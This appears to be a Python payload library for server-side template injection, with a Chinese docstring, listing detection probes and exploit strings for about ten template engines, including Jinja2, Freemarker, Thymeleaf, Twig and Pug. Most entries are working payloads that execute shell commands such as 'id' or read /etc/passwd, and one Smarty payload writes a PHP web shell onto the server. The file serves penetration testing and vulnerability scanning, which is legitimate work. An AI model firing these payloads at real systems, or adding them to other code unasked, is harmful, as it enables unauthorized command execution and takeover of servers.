"""SSTI模板注入Payload库 - 50+ Payloads"""

# 检测Payload
SSTI_DETECT = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "*{7*7}",
    "@(7*7)",
    "{{7*'7'}}",
    "${{7*7}}",
]

# Jinja2/Twig (Python Flask)
SSTI_JINJA2 = [
    "{{7*7}}",
    "{{7*'7'}}",
    "{{config}}",
    "{{config.items()}}",
    "{{self.__dict__}}",
    "{{request.environ}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{''.__class__.__base__.__subclasses__()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
    "{{namespace.__init__.__globals__.os.popen('id').read()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}",
    "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}",
]

# Freemarker (Java)
SSTI_FREEMARKER = [
    "${7*7}",
    "${.data_model.keySet()}",
    "${'freemarker.template.utility.Execute'?new()('id')}",
    "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    "[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}",
    "<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass('freemarker.template.utility.ObjectConstructor')><#assign rt=owc.newInstance().construct('java.lang.Runtime')>${rt.getRuntime().exec('id')}",
]

# Velocity (Java)
SSTI_VELOCITY = [
    "#set($x=7*7)$x",
    "#set($str=$class.inspect('java.lang.String').type)",
    "#set($chr=$class.inspect('java.lang.Character').type)",
    "#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
]

# Thymeleaf (Java Spring)
SSTI_THYMELEAF = [
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "*{T(java.lang.Runtime).getRuntime().exec('id')}",
    "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
    "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
    "${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}",
]

# ERB (Ruby)
SSTI_ERB = [
    "<%= 7*7 %>",
    "<%= system('id') %>",
    "<%= `id` %>",
    "<%= IO.popen('id').readlines() %>",
    "<%= require 'open3'; Open3.capture2('id') %>",
    "<%= File.read('/etc/passwd') %>",
]

# Smarty (PHP)
SSTI_SMARTY = [
    "{php}echo `id`;{/php}",
    "{system('id')}",
    "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[cmd]); ?>',self::clearConfig())}",
]

# Mako (Python)
SSTI_MAKO = [
    "${7*7}",
    "${self.module.cache.util.os.popen('id').read()}",
    "<%import os; x=os.popen('id').read()%>${x}",
]

# Pebble (Java)
SSTI_PEBBLE = [
    "{{ 7*7 }}",
    '{% set cmd = "id" %}{% set bytes = (1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName("java.lang.String").constructors[0].newInstance(([bytes]).toList()) }}',
]

# Twig (PHP)
SSTI_TWIG = [
    "{{7*7}}",
    "{{7*'7'}}",
    "{{dump(app)}}",
    "{{app.request.server.all|join(',')}}",
    "{{['id']|filter('system')}}",
    "{{['cat /etc/passwd']|filter('system')}}",
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
]

# Jade/Pug (Node.js)
SSTI_JADE = [
    "#{7*7}",
    "#{root.process.mainModule.require('child_process').execSync('id')}",
    "-var x = root.process.mainModule.require('child_process').execSync('id').toString()\n=x",
]

ALL_SSTI = SSTI_DETECT + SSTI_JINJA2 + SSTI_FREEMARKER + SSTI_VELOCITY + SSTI_THYMELEAF + SSTI_ERB + SSTI_SMARTY + SSTI_MAKO + SSTI_TWIG + SSTI_JADE
